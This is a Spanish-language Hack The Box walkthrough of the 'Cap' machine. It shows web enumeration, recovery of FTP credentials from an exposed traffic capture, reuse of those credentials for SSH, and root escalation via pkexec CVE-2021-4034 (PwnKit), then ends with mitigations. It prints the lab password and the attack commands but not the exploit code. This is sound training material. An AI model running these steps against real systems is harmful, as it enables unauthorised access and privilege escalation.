# Cap — HTB

**Plataforma:** Hack The Box  
**Dificultad:** Fácil  
**Categoría:** Linux / FTP / Wireshark / SUID / pkexec

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn -n 10.129.103.101
```

- Encontramos:

- `21/tcp` → FTP
- `22/tcp` → SSH
- `80/tcp` → HTTP — Gunicorn

- Accedemos a la aplicación web:

```text
http://10.129.103.101
```

- Encontramos un panel web en el que ya aparece autenticado el usuario `Nathan`.

## 2. Enumeración

### Enumeración web

- Observamos diferentes rutas en la aplicación:

```text
/networkstatus
/ip
/netstat
/data
```

- Para comprobar si existen más rutas utilizamos `ffuf`:

```bash
ffuf -u http://10.129.103.101/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
```

- Encontramos:

```text
/ip
/netstat
/data
```

### Enumeración de `/data`

- La ruta `/data` utiliza un identificador numérico que podemos modificar:

```text
http://10.129.103.101/data/X
```

- Podemos ir modificando `X` para consultar diferentes recursos.

- Al llegar a:

```text
http://10.129.103.101/data/0
```

- Encontramos información adicional sobre el recurso:

```text
Number of Packets
72

Number of IP Packets
69

Number of TCP Packets
69

Number of UDP Packets
...
```

- También podemos descargar el archivo correspondiente al tráfico capturado.

### Análisis con Wireshark

- El archivo descargado corresponde a una captura de tráfico de red.

- Abrimos Wireshark en segundo plano:

```bash
wireshark &> /dev/null & disown
```

- Importamos la captura y analizamos el tráfico FTP.

- Encontramos una petición con el usuario:

```text
Request: USER nathan
```

- Poco después encontramos:

```text
Request: PASS Buck3tH4TF0RM3!
```

- Hemos recuperado las credenciales:

```text
Usuario: nathan
Contraseña: Buck3tH4TF0RM3!
```

## 3. Explotación

### Acceso mediante FTP

- Probamos las credenciales obtenidas contra FTP:

```bash
ftp 10.129.103.101
```

- Introducimos:

```text
Usuario: nathan
Contraseña: Buck3tH4TF0RM3!
```

- Conseguimos autenticarnos correctamente.

- Listamos el contenido:

```ftp
ls
```

- Encontramos la User Flag y la descargamos:

```ftp
get user.txt
```

### Acceso mediante SSH

- Como tenemos unas credenciales válidas, probamos si también pueden utilizarse para SSH:

```bash
ssh nathan@10.129.103.101
```

- Utilizamos la misma contraseña:

```text
Buck3tH4TF0RM3!
```

- Conseguimos acceder al sistema mediante SSH.

- Comprobamos nuestro usuario:

```bash
id
```

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos si `nathan` puede ejecutar algún comando mediante `sudo`:

```bash
sudo -l
```

- No encontramos ningún comando útil para escalar privilegios.

### Enumeración de SUID

- Buscamos archivos con el bit SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Entre los resultados encontramos:

```text
/usr/bin/pkexec
```

- Comprobamos la versión:

```bash
pkexec --version
```

- Obtenemos:

```text
pkexec version 0.105
```

- Esta versión es vulnerable a **CVE-2021-4034**, una vulnerabilidad de escalada de privilegios en Polkit/pkexec conocida como **PwnKit**.

### Preparación del entorno

- Como estamos utilizando Kitty, configuramos la variable `TERM` para evitar problemas con el terminal:

```bash
export TERM=xterm-256color
```

### Explotación de pkexec

- Seguimos el procedimiento del exploit de **CVE-2021-4034**.

- Creamos los archivos necesarios y ejecutamos:

```bash
make all
```

- El proceso genera los archivos necesarios para la explotación, entre ellos:

```text
evil.so
exploit
```

- Ejecutamos el exploit:

```bash
./exploit
```

- Comprobamos nuestros privilegios:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios de root.

- Finalmente accedemos a la Root Flag:

```bash
cat /root/root.txt
```

## 5. Reporte

- La máquina **Cap** comienza con la enumeración de los servicios FTP, SSH y HTTP.
- La aplicación web permite acceder a diferentes recursos y, mediante `/data/X`, conseguimos descargar una captura de tráfico.
- Analizando la captura con Wireshark encontramos credenciales FTP válidas del usuario `nathan`:
```text
nathan : Buck3tH4TF0RM3!
```
- Las mismas credenciales también permiten acceder mediante SSH.
- Una vez dentro de la máquina, `sudo -l` no proporciona ningún vector de escalada.
- Buscando binarios SUID encontramos `pkexec` en la versión `0.105`.
- La versión es vulnerable a **CVE-2021-4034 (PwnKit)**.
- Preparamos y ejecutamos el exploit, consiguiendo una shell como `root`.
- Finalmente obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP
 ↓
/data/X
 ↓
Captura de tráfico
 ↓
Wireshark
 ↓
Credenciales FTP
 ↓
FTP
 ↓
SSH
 ↓
Enumeración SUID
 ↓
pkexec 0.105
 ↓
CVE-2021-4034
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| Exposición de captura de tráfico | Alta | Permite recuperar credenciales FTP |
| Reutilización de credenciales | Alta | Las credenciales FTP permiten acceso SSH |
| pkexec vulnerable a CVE-2021-4034 | Crítica | Escalada de privilegios a root |

### Mitigaciones

- No exponer capturas de tráfico a usuarios no autorizados.
- Evitar transmitir credenciales mediante protocolos inseguros como FTP.
- No reutilizar contraseñas entre diferentes servicios.
- Actualizar Polkit/pkexec a una versión corregida.
- Revisar periódicamente los binarios SUID instalados en el sistema.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Una aplicación web puede exponer archivos o capturas de tráfico que contengan información sensible.
- Wireshark permite analizar capturas PCAP y recuperar información de protocolos como FTP.
- FTP transmite las credenciales sin cifrar, por lo que pueden recuperarse desde una captura.
- Las credenciales encontradas deben probarse de forma controlada en otros servicios, ya que pueden existir reutilizaciones.
- `sudo -l` es una comprobación básica para identificar posibles vectores de escalada.
- `find / -perm -4000 -type f 2>/dev/null` permite localizar binarios SUID.
- `pkexec` forma parte de Polkit y una versión vulnerable puede permitir escalada de privilegios.
- **CVE-2021-4034 (PwnKit)** permite escalar privilegios hasta root en sistemas afectados.
